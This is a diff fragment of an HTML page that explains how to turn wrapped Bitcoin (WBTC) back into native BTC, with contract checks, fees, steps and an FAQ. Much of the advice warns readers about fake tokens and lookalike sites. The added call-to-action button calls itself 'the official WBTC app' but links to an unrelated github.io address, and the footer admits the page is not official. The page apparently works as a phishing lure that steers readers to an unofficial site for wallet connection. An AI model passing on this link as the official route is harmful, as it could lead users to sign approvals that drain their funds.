0x2260fac5e5542a773aa44fbcfedf7c193bc2c599. Anyone searching for unwrap BTC should check that address on Etherscan before approving transfers, because <a class="inline-link" href="https://www.coingecko.com/learn/what-is-wrapped-bitcoin-wbtc-and-how-does-it-work" rel="noopener noreferrer">fake wrapped Bitcoin tokens</a> often copy the WBTC name or logo. Contract verification matters most when a route asks for token approval or transfer permission. A legitimate provider should clearly show WBTC, the Ethereum network, the amount being redeemed, and the Bitcoin payout address. If a page shows a different token address without a credible reason, treat it as a different asset.</div></div></section><section class="section section-alt"><div class="container"><h2>WBTC redeem fees and timing</h2><div class="intent-a">WBTC redemption does not have one universal fee or time that applies to every user. Costs can include <a class="inline-link" href="https://ethereum.org/en/developers/docs/gas/" rel="noopener noreferrer">Ethereum gas for the WBTC transfer</a> or approval, a provider or merchant fee, and the <a class="inline-link" href="https://www.investopedia.com/terms/b/bitcoin-transaction.asp" rel="noopener noreferrer">Bitcoin miner fee for the BTC payout</a>. Timing depends on the provider flow, Ethereum confirmation, Bitcoin settlement, internal compliance checks, and liquidity. The WBTC whitepaper describes burn and redemption as merchant and custodian processes, so a wallet-only approval is not the full redemption lifecycle. Users should compare the net BTC received, not just the headline fee, before choosing a route.</div></div></section><section class="section"><div class="container"><h2>WBTC proof of reserves and backing</h2><div class="intent-a">WBTC is designed as a Bitcoin-backed ERC-20 token, with reserves and token supply meant to be publicly verifiable. Searchers looking to unwrap BTC often care whether each WBTC is backed before using a redemption route. The useful checks are the official WBTC site, the Ethereum token contract, reserve or custody information provided by the WBTC network, and <a class="inline-link" href="https://defillama.com/protocols/Dexes" rel="noopener noreferrer">independent listings such as CoinGecko or DeFiLlama</a>. Do not rely on a random app page to prove backing. If a provider cannot explain how it sources native BTC for redemption, use a different route.</div></div></section>
+  <section class="section"><div class="container"><h2>How to unwrap Unwrap BTC</h2><ol class="steps"><li><b>Open the official destination</b><span>Use the WBTC domain or a supported provider route instead of search ads, clones, or unsolicited links.</span></li><li><b>Verify the asset</b><span>Confirm WBTC on Ethereum and the contract address 0x2260fac5e5542a773aa44fbcfedf7c193bc2c599 before connecting a wallet.</span></li><li><b>Choose a redemption path</b><span>WBTC redemption generally relies on merchants, custodians, or venues that support moving from WBTC back to native Bitcoin.</span></li><li><b>Confirm settlement details</b><span>Review network fees, provider terms, <a class="inline-link" href="https://www.investopedia.com/terms/k/knowyourcustomer.asp" rel="noopener noreferrer">KYC requirements</a>, timing, and the destination Bitcoin address before approving anything.</span></li></ol><div class="cta-band"><div><p>Ready to unwrap?</p><p class="sub">Open the official WBTC app and verify the domain before you sign.</p></div><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open WBTC ↗</a></div></div></section>
+  <section class="section"><div class="container"><h2>WBTC vs native BTC</h2><div class="cmp-wrap"><table class="cmp-table"><thead><tr><th>Dimension</th><th>WBTC</th><th>Native BTC</th></tr></thead><tbody><tr><td>Network</td><td>ERC-20 token primarily used on Ethereum</td><td>Bitcoin network asset</td></tr><tr><td>Custody model</td><td>Backed through custodians and merchants</td><td>Held directly by whoever controls the Bitcoin private keys</td></tr><tr><td>Main use</td><td><a class="inline-link" href="https://www.bitstamp.net/learn/cryptocurrency-guide/what-is-wrapped-bitcoin-wbtc/" rel="noopener noreferrer">Ethereum DeFi, DEX liquidity, lending collateral</a></td><td>Bitcoin payments, self-custody, cold storage, BTC-native transfers</td></tr><tr><td>Fees</td><td>Ethereum gas plus provider redemption costs</td><td>Bitcoin miner fee for native transfers</td></tr><tr><td>Unwrap path</td><td>Redeem or swap through a supported provider</td><td>No unwrap needed</td></tr></tbody></table></div></div></section>
+  <section class="section section-alt" id="faq"><div class="container"><h2>Unwrap BTC FAQ</h2><div class="faq-list"><details open><summary><h3>What does unwrap BTC mean?</h3></summary><div>Unwrap BTC usually means converting a wrapped Bitcoin token such as WBTC back into native BTC. With WBTC, that means moving out of an ERC-20 token on Ethereum and into Bitcoin on the Bitcoin network. The exact process depends on the provider, because WBTC minting and burning are handled through a merchant and custodian framework rather than a simple consumer-only smart contract call.</div></details><details><summary><h3>Can I send WBTC directly to a Bitcoin address?</h3></summary><div>No. WBTC is an ERC-20 token and should not be sent directly to a native Bitcoin address. A Bitcoin address cannot receive an Ethereum ERC-20 transfer. To move from WBTC to BTC, use a route that explicitly supports redemption or exchange from WBTC on Ethereum to BTC on Bitcoin, and verify the destination address before confirming the transaction.</div></details><details><summary><h3>Is WBTC the same as BTC?</h3></summary><div>WBTC is not native BTC. It is a <a class="inline-link" href="https://www.hiro.so/blog/a-developers-guide-to-wrapped-bitcoin-wbtc" rel="noopener noreferrer">tokenized representation of Bitcoin</a> used on Ethereum and other DeFi routes, backed through a custodial system. BTC is the asset on the Bitcoin network. WBTC can be useful for Ethereum DeFi, but it introduces smart contract, custodian, merchant, and provider risk that native BTC held in a Bitcoin wallet does not have in the same form.</div></details><details><summary><h3>Who can burn WBTC for BTC?</h3></summary><div>In the WBTC framework, burning is a merchant-level process. Ordinary users typically redeem through supported merchants, custodians, exchanges, or other providers rather than calling a universal consumer redemption button. That means the practical answer depends on which provider accepts your WBTC, what compliance steps it requires, and how it pays out native Bitcoin.</div></details><details><summary><h3>What fees apply when unwrapping BTC?</h3></summary><div>There is no single fixed unwrap BTC fee. You may pay Ethereum gas, a WBTC transfer or approval cost, a provider or merchant fee, spread if using an exchange route, and a Bitcoin network fee for the payout transaction. Always compare the final BTC received and the estimated settlement time, because a low advertised fee can still produce a worse net result.</div></details><details><summary><h3>How do I verify real WBTC before unwrapping?</h3></summary><div>Verify the Ethereum token address 0x2260fac5e5542a773aa44fbcfedf7c193bc2c599 on Etherscan and cross-check official WBTC resources before approving a transfer. Also confirm that the route is asking for WBTC on the correct network and that the BTC payout address is yours. Name, logo, and ticker alone are not enough because lookalike tokens are easy to create.</div></details></div></div></section>
 </main>
 <footer class="site-footer"><div class="container">
-<nav aria-label="Footer" class="footer-nav"><a href="#how-it-works">How it works</a><a href="#fees-security">Fees security</a><a href="#common-mistakes">Common mistakes</a><a href="#routes">Routes</a><a href="#checklist">Checklist</a><a href="#faq">FAQ</a></nav>
-<p class="footer-note">Not the official Unwrap BTC app — verify the domain before connecting a wallet. Information on this page is for educational purposes only and is not financial advice.</p>
-<p class="footer-meta"><a href="#top">Back to top ↑</a></p>
+  <div class="footer-grid"></div>
+  <p class="footer-note">Not the official app; verify wbtc.network and the token contract before connecting. Educational only, not financial advice.</p>
+  <p class="footer-meta"><a href="#top">Back to top ↑</a></p>
 </div></footer>
-<script defer="" src="static/app.js"></script>
+<script src="static/app.js" defer></script>
 </body></html>
